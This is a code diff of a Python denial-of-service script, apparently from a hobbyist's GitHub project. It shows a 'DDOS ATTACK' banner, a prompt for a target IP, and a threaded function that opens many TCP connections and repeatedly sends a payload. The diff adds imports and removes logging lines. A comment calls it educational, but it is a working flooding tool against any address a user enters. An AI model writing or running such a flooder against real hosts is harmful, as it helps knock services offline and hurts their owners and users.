@@ -13,7 +13,7 @@ subprocess.run(["figlet", "DDOS ATTACK"])
 print()
 print("Author   : Robson Junior")
 print("Github   : github.com/robsujunior")
-print("Nota: Ferramenta para fins educacionais!")
+print("Note: Ferramenta para fins educacionais!")
 print()
 
 ip = input("IP Target : ")
@@ -36,6 +36,10 @@ print("ATAQUE DDOS INICIADO(educacional)")
 time.sleep(3)
 
 
+import socket
+import threading
+import random
+
 # Configurações
 tentativas_por_thread = 1000 # Evita loop infinito travando o PC
 
@@ -46,15 +50,13 @@ def estresse_maximo(host, porta):
     for _ in range(tentativas_por_thread):
         try:
             # Criar o socket com timeout baixíssimo para não desperdiçar tempo
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(0.5) 
-
-            print(f"[INFO] Conectando em {host}:{porta}")
+            
             sock.connect((host, porta))
             
             # Enviar o payload repetidamente na mesma conexão (Pipeline)
             for _ in range(10): 
-                print(f"[ENVIO] {host}:{porta} -> {payload.strip()}")
                 sock.sendall(payload)
                 
             # NOTA: Não usamos sock.recv() para não bloquear a thread
@@ -85,4 +87,3 @@ for t in threads:
 print("--- TESTE FINALIZADO ---")
 
 print("Todas as threads finalizaram")
-
